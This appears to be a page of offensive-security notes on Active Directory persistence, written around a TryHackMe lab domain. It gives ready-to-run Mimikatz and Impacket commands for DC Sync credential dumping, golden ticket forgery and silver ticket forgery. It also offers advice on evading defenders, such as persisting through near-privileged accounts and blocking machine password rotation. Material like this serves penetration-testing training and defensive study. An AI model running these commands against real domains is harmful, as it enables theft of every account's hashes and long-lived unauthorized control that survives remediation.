---
layout: default
title: "AD Persistence"
parent: "Active Directory"
nav_order: 3
---

# Active Directory Persistence

## Credential Strategy for Persistence

Not all credentials are equal for persistence purposes. Privileged credentials (Domain Admins) are rotated first when the blue team detects intrusion. Aim to persist through near-privileged credentials:

- **Local admin accounts** on many machines — organizations typically have groups with local admin rights across most workstations/servers.
- **Service accounts with delegation permissions** — allows forcing golden/silver tickets for Kerberos delegation attacks.
- **Accounts for privileged AD services** (Exchange, WSUS, SCCM) — can re-gain privileged foothold via AD exploitation.

---

## DC Sync (Credential Harvesting for Persistence)

Domain replication is performed by the KCC (Knowledge Consistency Checker) via RPC. Accounts with replication permissions (Domain Admins, Enterprise Admins, Administrators) can initiate DC Sync to harvest credentials.

### Dump a Specific Account
```
# Mimikatz
lsadump::dcsync /domain:za.tryhackme.loc /user:<Your low-privilege AD Username>
```

### Dump ALL Accounts
```
# Mimikatz - enable logging first
log <username>_dcdump.txt
lsadump::dcsync /domain:za.tryhackme.loc /all

# Parse results
cat <username>_dcdump.txt | grep "SAM Username"
cat <username>_dcdump.txt | grep "Hash NTLM"
```

Use recovered hashes for offline cracking or pass-the-hash attacks.

### Remote DC Sync (Impacket)
```
impacket-secretsdump -just-dc-user $Targetuser $domain.com/$pwnedUser:"$password"@$IP
impacket-secretsdump [domain]/[user]:[password/hash]@[Target IP]
```

---

## Persistence Through Tickets

### Kerberos Authentication Overview
1. User sends AS-REQ to KDC (timestamp encrypted with user's NTLM hash)
2. DC validates and returns TGT (signed with KRBTGT account's password hash)
3. User sends TGT to DC requesting TGS for a resource
4. DC returns TGS (encrypted with NTLM hash of target service)
5. User presents TGS to the service for access

### Golden Tickets
Golden Tickets are forged TGTs — bypass steps 1 and 2. Having a valid privileged TGT allows requesting TGS for almost any service.

**Requirements:** KRBTGT account's password hash, domain name, domain SID, user ID to impersonate.

Key properties:
- The KDC only validates the user account in TGT if it's older than 20 minutes — can use disabled, deleted, or non-existent accounts.
- Can overwrite ticket validity policies (e.g., set valid for 10 years instead of 10 hours).
- KRBTGT password almost never changes by default — persistent TGT generation until manually rotated.
- Blue team must rotate KRBTGT password TWICE (current and previous are both valid).
- Rotating KRBTGT is painful — causes many services to stop working.
- Bypasses smart card authentication.
- Can be generated on non-domain-joined machines (harder to detect).

```
# Get Domain SID
Get-ADDomain

# Mimikatz - generate Golden Ticket
kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT> /endin:600 /renewmax:10080 /ptt

# Parameters
# /admin    - username to impersonate (does not need to exist)
# /domain   - FQDN of domain
# /id       - user RID (500 = default Administrator)
# /sid      - domain SID
# /krbtgt   - NTLM hash of KRBTGT account
# /endin    - ticket lifetime in minutes (default AD policy = 600 / 10 hours)
# /renewmax - max ticket lifetime with renewal in minutes (default = 10080 / 7 days)
# /ptt      - inject ticket directly into session
```

From classic Mimikatz method:
```
privilege::debug
lsadump::lsa /patch   # get SID and NTLM of krbtgt
# (can be run from any machine after)
kerberos::purge
kerberos::golden /user:$user /domain:$domain.com /sid:$SID /krbtgt:$krbtgtNTLM /ptt
misc::cmd
# PsExec.exe \\$targetmachine cmd.exe  (use hostname, NOT IP)
```

### Silver Tickets
Silver Tickets are forged TGS tickets — skip all DC communication (steps 1-4) and interface directly with the target service.

Key properties:
- TGS is signed by the machine account of the targeted host (not KRBTGT).
- Scope is limited to the specific service on the specific server.
- No TGT involved — DC never contacted. Only logs on targeted server.
- Can use non-existing user as long as ticket has correct SIDs for local admin group.
- Machine account password rotates every 30 days — modify registry parameter to prevent rotation and maintain persistence.

```
# Mimikatz - generate Silver Ticket
kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server> /rc4:<NTLM Hash of machine account> /service:cifs /ptt

# Parameters
# /admin   - username to impersonate
# /domain  - FQDN of domain
# /id      - user RID
# /sid     - domain SID
# /target  - hostname of target server (e.g., THMSERVER1.za.tryhackme.loc)
# /rc4     - NTLM hash of target machine account (note the $ suffix in DC dump)
# /service - service to request (cifs for file access)
# /ptt     - inject ticket directly

# Verify
dir \\thmserver1.za.tryhackme.loc\c$\
```

Alternative (Impacket):
```
impacket-ticketer -nthash $NTLMHash -domain-sid $SID -domain $domain.com -spn $SPN -user-id 500 Administrator
```
